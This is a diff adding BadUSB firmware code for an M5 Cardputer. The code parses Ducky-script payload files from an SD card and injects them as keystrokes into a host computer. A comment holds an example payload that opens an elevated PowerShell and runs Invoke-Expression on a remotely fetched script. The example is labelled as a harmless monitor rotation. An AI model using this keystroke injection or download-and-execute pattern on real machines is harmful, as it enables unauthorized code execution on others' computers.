@@ -1,0 +1,323 @@
+#ifdef CARDPUTER
+#include "bad_usb.h"
+#include "globals.h"
+#include "sd_functions.h"
+#include "display.h"
+#include "mykeyboard.h"
+
+USBHIDKeyboard Kb;
+
+
+//#include <BleKeyboard.h>
+//BleKeyboard bleKeyboard;
+//
+
+#define KEY_PAUSE 0xD0
+#define KEY_PRINT_SCREEN 0xCE
+#define KEY_MENU 0xED
+#define KEY_SCROLL_LOCK 0xCF
+
+
+#define DEF_DELAY 100
+
+bool needALCOLORraw = true;
+
+
+
+
+
+/* Example of payload file
+
+REM Author: UNC0V3R3D
+REM Description: Uses powershell to rotate the monitor by 90 degrees.
+REM Version: 1.0
+REM Category: FUN
+DELAY 800
+GUI r
+DELAY 800
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 800
+ENTER
+DELAY 800
+LEFTARROW
+DELAY 800
+ENTER
+DELAY 500
+STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/monitor_rotation.ps1").Content
+
+
+*/
+
+void key_input(String bad_script) {
+  delay(1000);
+
+  if (SD.exists(bad_script) && bad_script!="") {
+    File payloadFile = SD.open(bad_script, "r");
+    if (payloadFile) {
+      tft.setCursor(0, 40);
+      tft.println("from file!");
+      String lineContent = "";
+      String Command = "";
+      char Cmd[15];
+      String Argument = "";
+      String RepeatTmp = "";
+      char ArgChar;
+      bool ArgIsCmd;  // Verifies if the Argument is DELETE, TAB or F1-F12
+      int cmdFail;    // Verifies if the command is supported, mus pass through 2 if else statemens and summ 2 to not be supported
+      int line;       // Shows 3 commands of the payload on screen to follow the execution
+
+
+      Kb.releaseAll();
+      tft.setTextSize(1);
+      tft.setCursor(0, 0);
+      tft.fillScreen(BGCOLOR);
+      line = 0;
+
+      while (payloadFile.available()) {
+        lineContent = payloadFile.readStringUntil('\n');  // O CRLF é uma combinação de dois caracteres de controle: o “Carriage Return” (retorno de carro) representado pelo caractere “\r” e o “Line Feed” (avanço de linha) representado pelo caractere “\n”.
+        if (lineContent.endsWith("\r")) lineContent.remove(lineContent.length() - 1);
+
+        ArgIsCmd = false;
+        cmdFail = 0;
+        RepeatTmp = lineContent.substring(0, lineContent.indexOf(' '));
+        RepeatTmp = RepeatTmp.c_str();
+        if (RepeatTmp == "REPEAT") {
+          if (lineContent.indexOf(' ') > 0) {
+            RepeatTmp = lineContent.substring(lineContent.indexOf(' ') + 1);  // how many times it will repeat, using .toInt() conversion;
+            if (RepeatTmp.toInt() == 0) {
+              RepeatTmp = "1";
+              tft.setTextColor(ALCOLOR);
+              tft.println("REPEAT argument NaN, repeating once");
+            }
+          } else {
+            RepeatTmp = "1";
+            tft.setTextColor(ALCOLOR);
+            tft.println("REPEAT without argument, repeating once");
+          }
+        } else {
+          Command = lineContent.substring(0, lineContent.indexOf(' '));    // get the Command
+          strcpy(Cmd, Command.c_str());                                    // get the cmd
+          Argument = lineContent.substring(lineContent.indexOf(' ') + 1);  // get the argument
+          RepeatTmp = "1";
+        }
+        uint16_t i;
+        for (i = 0; i < RepeatTmp.toInt(); i++) {
+          char OldCmd[15];
+          //Command = char(Command.c_str());
+          Argument = Argument.c_str();
+          ArgChar = Argument.charAt(0);
+
+          if (Argument == "F1" || Argument == "F2" || Argument == "F3" || Argument == "F4" || Argument == "F5" || Argument == "F6" || Argument == "F7" || Argument == "F8" || Argument == "F9" || Argument == "F10" || Argument == "F11" || Argument == "F2" || Argument == "DELETE" || Argument == "TAB") { ArgIsCmd = true; }
+
+          if (strcmp(Cmd, "REM") == 0)          { Serial.println(" // " + Argument); }                  else { cmdFail++; }
+          if (strcmp(Cmd, "DELAY") == 0)          delay(Argument.toInt());                              else { cmdFail++; }
+          if (strcmp(Cmd, "DEFAULTDELAY") == 0 || strcmp(Cmd, "DEFAULT_DELAY") == 0) delay(DEF_DELAY);  else { cmdFail++; }  //100ms
+          if (strcmp(Cmd, "STRING") == 0)         Kb.print(Argument);                                   else { cmdFail++; }
+          if (strcmp(Cmd, "STRINGLN") == 0)       Kb.println(Argument);                                 else { cmdFail++; } 
+          if (strcmp(Cmd, "ENTER") == 0)        { Kb.press(KEY_RETURN); Kb.releaseAll(); }              else { cmdFail++; }  
+          if (strcmp(Cmd, "SHIFT") == 0)        { Kb.press(KEY_LEFT_SHIFT);                                if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}  // Save Cmd into OldCmd and then set Cmd = Argument  
+          if (strcmp(Cmd, "ALT") == 0)          { Kb.press(KEY_LEFT_ALT);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}  // This is made to turn the code faster and to recover
+          if (strcmp(Cmd, "CTRL-ALT") == 0)     { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL);         if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}  // the Cmd after the if else statements, in order to
+          if (strcmp(Cmd, "CTRL-SHIFT") == 0)   { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);       if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}  // the Cmd REPEAT work as intended.
+          if (strcmp(Cmd, "ALT-SHIFT") == 0)    { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT);        if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}
+          if (strcmp(Cmd, "ALT-GUI") == 0)      { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_GUI);          if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}
+          if (strcmp(Cmd, "GUI-SHIFT") == 0)    { Kb.press(KEY_LEFT_GUI); Kb.press(KEY_LEFT_SHIFT);        if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}
+          if (strcmp(Cmd, "GUI") == 0 || strcmp(Cmd, "WINDOWS") == 0) { Kb.press(KEY_LEFT_GUI);            if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}
+          if (strcmp(Cmd, "CTRL") == 0 || strcmp(Cmd, "CONTROL") == 0) { Kb.press(KEY_LEFT_CTRL);          if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str());}} else { cmdFail++;}
+          if (strcmp(Cmd, "ESC") == 0 || strcmp(Cmd, "ESCAPE") == 0) {Kb.press(KEY_ESC);Kb.releaseAll(); } else { cmdFail++;}
+          if (strcmp(Cmd, "DOWNARROW") == 0)    { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "DOWN") == 0)         { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "LEFTARROW") == 0)    { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "LEFT") == 0)         { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "RIGHTARROW") == 0)   { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "RIGHT") == 0)        { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "UPARROW") == 0)      { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "UP") == 0)           { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "BREAK") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "CAPSLOCK") == 0)     { Kb.press(KEY_CAPS_LOCK);  Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "PAUSE") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "BACKSPACE") == 0)    { Kb.press(KEY_BACKSPACE);  Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "END") == 0)          { Kb.press(KEY_END);        Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "HOME") == 0)         { Kb.press(KEY_HOME);       Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "INSERT") == 0)       { Kb.press(KEY_INSERT);     Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "NUMLOCK") == 0)      { Kb.press(LED_NUMLOCK);    Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "PAGEUP") == 0)       { Kb.press(KEY_PAGE_UP);    Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "PAGEDOWN") == 0)     { Kb.press(KEY_PAGE_DOWN);  Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "PRINTSCREEN") == 0)  { Kb.press(KEY_PRINT_SCREEN);Kb.releaseAll();}else { cmdFail++;}
+          if (strcmp(Cmd, "SCROLLOCK") == 0)    { Kb.press(KEY_SCROLL_LOCK);Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "MENU") == 0)         { Kb.press(KEY_MENU);       Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F1") == 0)           { Kb.press(KEY_F1);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F2") == 0)           { Kb.press(KEY_F2);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F3") == 0)           { Kb.press(KEY_F3);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F4") == 0)           { Kb.press(KEY_F4);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F5") == 0)           { Kb.press(KEY_F5);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F6") == 0)           { Kb.press(KEY_F6);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F7") == 0)           { Kb.press(KEY_F7);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F8") == 0)           { Kb.press(KEY_F8);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F9") == 0)           { Kb.press(KEY_F9);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F10") == 0)          { Kb.press(KEY_F10);        Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F11") == 0)          { Kb.press(KEY_F11);        Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "F12") == 0)          { Kb.press(KEY_F12);        Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "TAB") == 0)          { Kb.press(KEY_TAB);        Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "DELETE") == 0)       { Kb.press(KEY_DELETE);     Kb.releaseAll();} else { cmdFail++;}
+
+
+          if (ArgIsCmd) strcpy(Cmd, OldCmd);  // Recover the command to run in case of REPEAT
+
+          //else if(strcmp(Command, "SPACE") ==0) Kb.press(" "); //Supported on Flipper but not here, yet
+          //else if(strcmp(Command, "APP") ==0) Kb.press(APP); //Supported on Flipper but not here, yet
+          //else if(strcmp(Command, "SYSRQ") ==0) Kb.press(SYSRQ); //Supported on Flipper but not here, yet
+          Kb.releaseAll();
+
+          if (line == 7) {
+            tft.setCursor(0, 0);
+            tft.fillScreen(BGCOLOR);
+            line = 0;
+          }
+          line++;
+
+          if (cmdFail == 51) {
+            tft.setTextColor(ALCOLOR);
+            tft.print(Command);
+            tft.println(" -> Not Supported, running as STRINGLN");
+            if (Command != Argument) {
+              Kb.print(Command);
+              Kb.print(" ");
+              Kb.println(Argument);
+            } else {
+              Kb.println(Command);
+            }
+          } else {
+            tft.setTextColor(FGCOLOR);
+            tft.println(Command);
+          }
+          tft.setTextColor(TFT_WHITE);
+          tft.println(Argument);
+
+          if (strcmp(Cmd, "REM") != 0) delay(DEF_DELAY);  //if command is not a comment, wait DEF_DELAY until next command (100ms)
+        }
+      }
+      tft.setTextSize(FM);
+      payloadFile.close();
+      Serial.println("Finished badusb payload execution...");
+    }
+  } else {
+    // rick
+    Serial.println("rick");
+    tft.setCursor(0, 40);
+    tft.println("rick");
+    Kb.press(KEY_LEFT_GUI);
+    Kb.press('r');
+    Kb.releaseAll();
+    delay(1000);
+    Kb.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+    Kb.press(KEY_RETURN);
+    Kb.releaseAll();
+  }
+
+  delay(1000);
+  Kb.releaseAll();
+}
+
+
+void usb_setup() {
+  Serial.println("BadUSB begin");
+  tft.fillScreen(BGCOLOR);
+  tft.setTextColor(FGCOLOR, BGCOLOR);
+  tft.setCursor(0, 0);
+  int rot = 3;
+  int tftfileCount = 8;
+  String bad_script = "";
+
+  bad_script = "/badpayload.txt";
+  bad_script = loopSD(true);
+
+
+  tft.setTextSize(FM);
+  tft.fillScreen(BGCOLOR);
+  tft.setCursor(0, 0);
+  tft.println("Sending...");
+
+  Kb.begin();
+  USB.begin();
+
+  delay(2000);
+  key_input(bad_script);
+  tft.setCursor(0, 0);
+  displayRedStripe("Payload Sent",TFT_WHITE, FGCOLOR);
+  checkSelPress();
+  while (!checkSelPress()) {
+      // nothing here, just to hold the screen press Ok of M5.
+  }
+  returnToMenu=true;
+  
+}
+
+void usb_loop() {
+}
+
+/*
+
+Now cardputer works as a USB Keyboard!
+
+Keyboard functions 
+Created by: edulk2, thankss
+
+
+
+void keyboard_setup() {
+  tft.fillScreen(BGCOLOR);
+  tft.setRotation(1);
+  tft.setTextColor(FGCOLOR);
+  tft.setTextDatum(MC_DATUM);
+  tft.setTextSize(2);
+  tft.drawString("Keyboard Started",
+                  tft.width() / 2,
+                  tft.height() / 2);
+  Kb.begin();
+  USB.begin();
+  tft.setTextColor(FGCOLOR, BGCOLOR);
+}
+
+void keyboard_loop() {
+  M5Cardputer.update();
+  if (M5Cardputer.Keyboard.isChange()) {
+    if (M5Cardputer.Keyboard.isPressed()) {
+      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+
+      KeyReport report = { 0 };
+      report.modifiers = status.modifiers;
+      uint8_t index = 0;
+      for (auto i : status.hid_keys) {
+        report.keys[index] = i;
+        index++;
+        if (index > 5) {
+          index = 5;
+        }
+      }
+      Kb.sendReport(&report);
+      Kb.releaseAll();
+
+      // only text for tftlay
+      String keyStr = "";
+      for (auto i : status.word) {
+        if (keyStr != "") {
+          keyStr = keyStr + "+" + i;
+        } else {
+          keyStr += i;
+        }
+      }
+
+      if (keyStr.length() > 0) {
+        tft.clear();
+        tft.drawString("Pressed: " + keyStr,
+                        tft.width() / 2,
+                        tft.height() / 2);
+      }
+    }
+  }
+}
+*/
+
+
+#endif
